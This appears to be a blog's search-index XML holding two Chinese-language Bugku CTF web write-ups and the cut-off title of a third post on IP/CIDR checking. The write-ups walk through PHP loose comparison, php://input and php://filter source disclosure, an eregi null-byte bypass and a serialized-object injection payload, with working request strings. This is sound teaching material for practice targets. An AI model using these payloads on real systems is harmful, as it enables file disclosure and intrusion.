<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【Bugku CTF】 Web —— never give up</title>
    <url>/2017/12/26/bugku-ctf-web-never-give-up/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>此题为 Web 基础题，难度中低，需要的基础知识有：<strong>HTML、PHP、HTTP 协议</strong>。</p>
<p>首先考查<strong>发现源码</strong>的能力，其次重点考查 <strong>PHP 黑魔法</strong>的使用，相关链接如下：</p>
<ul>
<li>题目链接：<a href="http://123.206.31.85/challenges#never%20give%20%20up">http://123.206.31.85/challenges#never give  up</a></li>
<li>解题链接：<a href="http://120.24.86.145:8006/test/hello.php">http://120.24.86.145:8006/test/hello.php</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-never-give-up/question.png" alt="question"></p>
<h1 id="0x01-拦截跳转"><a href="#0x01-拦截跳转" class="headerlink" title="0x01 拦截跳转"></a>0x01 拦截跳转</h1><p>点开解题链接，除了一句 <strong>never never never give up !!!</strong> 之外空空如也，直接查看源码，发现一条注释中有线索：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-never-give-up/hello-php-source.png" alt="hello-php-source"></p>
<p>根据提示打开链接：<a href="http://120.24.86.145:8006/test/1p.html">http://120.24.86.145:8006/test/1p.html</a>，发现跳转回 <a href="http://www.bugku.com/">Bugku</a> 的主站，所以祭出 BurpSuite 进行抓包拦截。</p>
<p>请求数据包如下：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-never-give-up/request.png" alt="request"></p>
<p>响应数据包如下：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-never-give-up/response.png" alt="response"></p>
<h1 id="0x02-三重解码"><a href="#0x02-三重解码" class="headerlink" title="0x02 三重解码"></a>0x02 三重解码</h1><p>根据响应内容中变量 <code>Words</code> 的值，容易得出是一段 <strong>URL 编码</strong>后的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E</span><br></pre></td></tr></table></figure>

<p>对其进行解码，得到一条 Javascript 语句与一大段注释，易看出注释中的内容是一段 <strong>Base64 编码</strong>后的数据：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://www.bugku.com&#x27;</span>;&lt;/script&gt; </span><br><span class="line">&lt;!--<span class="title class_">JTIyJTNCaWYlMjglMjElMjRfR</span>0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;</span><br></pre></td></tr></table></figure>

<p>将注释中的内容进行解码，发现又是一大段 <strong>URL 编码</strong>后的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure>

<p>进行 URL 解码后，终于得到一段不完整的 <strong>PHP 核心源码</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	require(&quot;</span>f4l2a3g.txt<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print &quot;</span><span class="keyword">never</span> <span class="keyword">never</span> <span class="keyword">never</span> give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中各条核心语句的作用如下：</p>
<ul>
<li>第 1 行：限制 URL 查询字符串中必须有非空非零变量 <code>id</code></li>
<li>第 9 行：限制变量 <code>$a</code> 中不能含有字符 <code>.</code></li>
<li>第 15 行：要满足以下 5 条表达式才会爆 flag：</li>
<li>变量 <code>$data</code> 弱等于字符串 <code>bugku is a nice plateform!</code></li>
<li>变量 <code>$id</code> 弱等于整型数 0</li>
<li>变量 <code>$b</code> 的长度大于 5</li>
<li>字符串 <code>1114</code> 要与字符串 <code>111</code> 连接变量 <code>$b</code> 的第一个字符构成的正则表达式匹配</li>
<li>变量 <code>$b</code> 的第一个字符弱不等于整型数 4</li>
</ul>
<p>注意，源码中已暴露出 flag 文件，有可能是出题人的失误，也有可能是出题人故意用第 15 行复杂的语句迷惑你，实际上可以绕过。因此，直接访问链接 <a href="http://120.24.86.145:8006/test/f4l2a3g.txt">http://120.24.86.145:8006/test/f4l2a3g.txt</a> 即可获得 flag。</p>
<p>不过，第 15 行的语句也是可解的（应该也是此题的本意），请继续往下看。</p>
<h1 id="0x03-PHP-黑魔法"><a href="#0x03-PHP-黑魔法" class="headerlink" title="0x03 PHP 黑魔法"></a>0x03 PHP 黑魔法</h1><p>本节分别针对源码中 <code>$id</code>、<code>$a</code>、<code>$b</code> 三个变量需要满足的条件进行讲解。</p>
<h2 id="PHP-弱类型比较"><a href="#PHP-弱类型比较" class="headerlink" title="PHP 弱类型比较"></a>PHP 弱类型比较</h2><p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-never-give-up/loose-comparison.png" alt="loose-comparison"></p>
<p>由上图可知，变量 <code>$id</code> 若想满足非空非零且弱等于整型数 0，则 <code>$id</code> 的值只能为非空非零字符串，这里假设 <code>$id = &quot;asd&quot;</code>。</p>
<blockquote>
<p>有关 PHP 类型比较的详情可参考：<a href="http://php.net/manual/zh/types.comparisons.php">PHP 类型比较表</a></p>
</blockquote>
<h2 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h2><p>源码中变量 <code>$data</code> 是由 <code>file_get_contents()</code> 函数读取变量 <code>$a</code> 的值而得，所以 <code>$a</code> 的值必须为数据流。</p>
<p>在服务器中自定义一个内容为 <code>bugku is a nice plateform!</code> 文件，再把此文件路径赋值给 <code>$a</code>，显然不太现实。因此这里用伪协议 <a href="http://php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;</a> 来访问输入输出的数据流，其中 <code>php://input</code> 可以访问原始请求数据中的只读流。这里令 <code>$a = &quot;php://input&quot;</code>，并在请求主体中提交字符串 <code>bugku is a nice plateform!</code>。</p>
<blockquote>
<p>有关 PHP 伪协议的详情可参考：<a href="http://php.net/manual/zh/wrappers.php">支持的协议和封装协议</a></p>
</blockquote>
<h2 id="eregi-截断漏洞"><a href="#eregi-截断漏洞" class="headerlink" title="eregi() 截断漏洞"></a>eregi() 截断漏洞</h2><p>CTF 题做多了就知道 <code>ereg()</code> 函数或 <code>eregi()</code> 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。</p>
<p>源码中待匹配字符串（第二个参数）已确定为 <code>&quot;1114&quot;</code>，正则表达式（第一个参数）由 <code>&quot;111&quot;</code> 连接 <code>$b</code> 的第一个字符组成，若令 <code>substr($b,0,1) = &quot;\x00&quot;</code>，即满足 <code>&quot;1114&quot;</code> 与 <code>&quot;111&quot;</code> 匹配。因此，这里假设 <code>$b = &quot;\x0012345&quot;</code>，才能满足以上三个条件。</p>
<p>有关 PHP 的各种黑魔法可参考：</p>
<blockquote>
<p><a href="http://skysec.top/2017/07/22/PHP%E5%87%BD%E6%95%B0%E9%BB%91%E9%AD%94%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/">PHP函数黑魔法小总结</a><br><a href="http://www.10tiao.com/html/664/201702/2650420346/1.html">CTF之PHP黑魔法总结</a><br><a href="http://www.secbox.cn/hacker/1889.html">那些年学过的PHP黑魔法</a></p>
</blockquote>
<h1 id="0x04-构造-payload-爆-flag"><a href="#0x04-构造-payload-爆-flag" class="headerlink" title="0x04 构造 payload 爆 flag"></a>0x04 构造 payload 爆 flag</h1><p>分析出以上三个变量应该等于什么值后，接下来构造出对应的 payload 自然就 get flag 了。之所以将构造 payload 单独拿出来讲，是想分享笔者在构造 payload 过程中踩过的坑。</p>
<p>在构造变量 <code>b</code> 中的空字符时，过早将空字符 <code>\x00</code> 放入，在提交请求时导致请求头截断，继而请求失败，得不到响应。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-never-give-up/wrong-payload.png" alt="wrong-payload"></p>
<p>因为 <code>b</code> 是 URL 查询字符串中的变量，不应该在此放入空字符 <code>\x00</code>，而应该为空字符的 URL 编码 <code>%00</code>。注意，虽然 <code>b=%0012345</code> 实际字符串长度为 8 字节，但在后台脚本读入数据时，会将 URL 编码 <code>%00</code> 转换成 1 字节。所以说，空字符应该在后台脚本的变量中出现，而不是在 URL 查询字符串变量中出现。</p>
<p>构造出正确的 payload 后，完成此题常规思路的做法：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-never-give-up/flag.png" alt="flag"></p>
<p>若有不足或错误之处劳烦指出，欢迎有其他解法的朋友前来讨论交流。</p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>Audit</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>【Bugku CTF】 Web —— welcome to bugkuctf</title>
    <url>/2018/01/03/bugku-ctf-web-welcome-to-bugkuctf/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>此题运用了许多 PHP 技巧，解题思路惊艳，特此想分享一下思考过程。与其说此题是 Web 题，不如说是道 PHP 技巧题，难度中等，要求有<strong>扎实的 PHP 基础</strong>。</p>
<p>涉及到的技巧有 <strong>PHP 伪协议、魔术方法、对象的序列化与反序列化</strong>等，相关链接如下：</p>
<ul>
<li>题目链接：<a href="http://123.206.31.85/challenges#welcome%20to%20bugkuctf">http://123.206.31.85/challenges#welcome to bugkuctf</a></li>
<li>解题链接：<a href="http://120.24.86.145:8006/test1/">http://120.24.86.145:8006/test1/</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/question.png" alt="question"></p>
<h1 id="0x01-PHP-伪协议获取源码"><a href="#0x01-PHP-伪协议获取源码" class="headerlink" title="0x01 PHP 伪协议获取源码"></a>0x01 PHP 伪协议获取源码</h1><p>点开链接，依然按常规套路只有一句话：<strong>you are not the number of bugku !</strong> ，继续查看源码发现线索：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/hint.png" alt="hint"></p>
<p>这里需要满足两点：</p>
<ol>
<li>构造合适的 URL 查询变量 <code>txt</code> 使得 PHP 变量 <code>$user</code> 满足 if 语句的条件</li>
<li>令变量 <code>$file</code> 通过文件包含函数 <code>include()</code> 获取指定页面的源码</li>
</ol>
<p>注意，此处还未涉及到查询变量 <code>password</code>。</p>
<h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>在 if 语句中，通过 <code>file_get_contents()</code> 函数读取变量 <code>$user</code> 的值后，再与字符串 <code>welcome to the bugkuctf</code> 比较。</p>
<p>因此可借助伪协议 <a href="http://php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;</a> 中的 <code>php://input</code> 访问原始请求数据中的只读流。这里令 <code>$user = &quot;php://input&quot;</code>，并在请求主体中提交字符串 <code>welcome to the bugkuctf</code>。</p>
<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>在 <code>include($file); //hint.php</code> 语句中，相当于把变量 <code>$file</code> 的值在该语句的位置读入，结合后面的提示，应该是要把 hint.php 页面的源码以某种形式包含在当前页面内。</p>
<p>因此可利用 <code>php://filter</code> 以某种方式筛选过滤特定的数据流。这里令 <code>$file = php://filter/read=convert.base64-encode/resource=hint.php</code>，意思是<strong>以 Base64 编码的方式过滤出 hint.php 页面的源码</strong>，也可以把它理解为一个具有 URI 形式的特殊函数，该函数能把 hint.php 源码以 Base64 编码的方式读入。</p>
<p>根据以上两种 PHP 伪协议的分析，构造出以下 payload 即得 hint.php 源码的 Base64 编码:</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/get-source.png" alt="get-source"></p>
<p>解码后得到 hint.php 源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>根据注释发现了藏 flag 的页面，再次照葫芦画瓢去偷看 flag.php 源码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/flag-fail.png" alt="flag-fail"></p>
<p>…果然没那么简单，唔，卡住了，怎么办？</p>
<p>别忘了还有主页面啊！<strong>利用主页面的功能也能读取自身的源码</strong>，这一点很容易被遗忘，所以这次很顺利就获得了 index.php 的源码（注意，路径末尾不带 php 文件的 URL <code>http://120.24.86.145:8006/test1/</code>，一般默认就是访问 <code>http://120.24.86.145:8006/test1/index.php</code>）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$txt</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不能现在就给你flag哦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not the number of bugku ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;  </span><br></pre></td></tr></table></figure>

<p>注意到第 8 行将 <code>$file</code> 变量中的 <code>flag</code> 字符串过滤了，印证了前面的结果。到此，我们顺利地将此题变成一道 PHP 白盒审计题了，现在才是此题最有意思的地方，如何利用已知的 hint.php 与 index.php 的源码去获取 flag.php 的内容？请继续往下看。</p>
<h1 id="0x02-序列化构造-payload"><a href="#0x02-序列化构造-payload" class="headerlink" title="0x02 序列化构造 payload"></a>0x02 序列化构造 payload</h1><p>要理清 hint.php 与 index.php 之间的关系，首先要理解 hint.php 中的 <code>__tostring()</code> 函数是何方神圣。</p>
<h2 id="魔术方法-toString"><a href="#魔术方法-toString" class="headerlink" title="魔术方法 __toString()"></a>魔术方法 __toString()</h2><p>「写在前面」：PHP 中变量与方法的命名一般遵循<strong>小驼峰式命名法（Lower Camel Case）</strong>，类的命名一般遵循<strong>大驼峰式命名法（Upper Camel Case）</strong>，也称<strong>帕斯卡命名法（Pascal Case）</strong>，并且<strong>普通变量、超级全局变量、常量、数组索引等区分大小写</strong>，而<strong>函数名、方法名、类名、魔术变量等不区分大小写</strong>，但最好使用与定义一样的大小写名字。详情可参考：</p>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/%E9%A7%9D%E5%B3%B0%E5%BC%8F%E5%A4%A7%E5%B0%8F%E5%AF%AB">驼峰式大小写</a><br><a href="https://www.cnblogs.com/daipianpian/p/5721377.html">PHP命名大小写敏感规则</a></p>
</blockquote>
<p>因此看到此魔术方法定义为 <code>__toString()</code>，在源码中却是 <code>__tostring()</code> 就不足为奇了。</p>
<p><strong>魔术方法 <a href="http://php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a></strong> 定义在类中，在该类的对象被当成字符串打印时执行，并且必须返回一个字符串，否则出现报错。</p>
<p>因此在 hint.php 中，当 <code>Flag</code> 类的对象被打印时，将获取 <code>$file</code> 变量（注意此处的 <code>$file</code> 与 index.php 中的不同）中文件的内容并输出，最后返回字符串 <code>good</code>。</p>
<h2 id="对象的序列化"><a href="#对象的序列化" class="headerlink" title="对象的序列化"></a>对象的序列化</h2><p>再来看看 index.php 的 11-15 行，满足了上面所有 if 语句的条件后，先包含变量 <code>$file</code>，再反序列化变量 <code>$password</code> 后输出。此段代码是本题的核心，理解了就能找到 index.php 与 hint.php 之间的联系，从而构造出 payload。</p>
<p><strong>核心思想如下：先用 <code>include()</code> 函数包含 hint.php，从而引入 <code>Flag</code> 类；再将该类对象的序列化字符串赋值给 <code>$passsword</code>，且令对象的成员变量 <code>$file = flag.php</code>， 所以在反序列化后得到上述对象；最后用 <code>echo</code> 打印该对象，从而触发 <code>__toString()</code> 函数，输出 flag.php 的值。</strong></p>
<p>通过以下代码可获得成员变量 <code>$file = flag.php</code> 的 <code>Flag</code> 对象的序列化字符串：<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$f</span>-&gt;file = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>根据以上所有的分析，可以将 payload 总结如下：</p>
<p><strong><code>http://120.24.86.145:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></strong></p>
<p>最后别忘了在请求主体中提交字符串 <code>welcome to the bugkuctf</code> 喔，提交后得到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/flag.png" alt="flag"></p>
<p>若有不足或错误之处劳烦指出，欢迎有疑问的朋友前来留言讨论。</p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>Audit</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript 判断 IP 地址是否属于 CIDR 范围</title>
    <url>/2020/02/16/check-if-ip-belongs-to-cidr-by-javascript/</url>
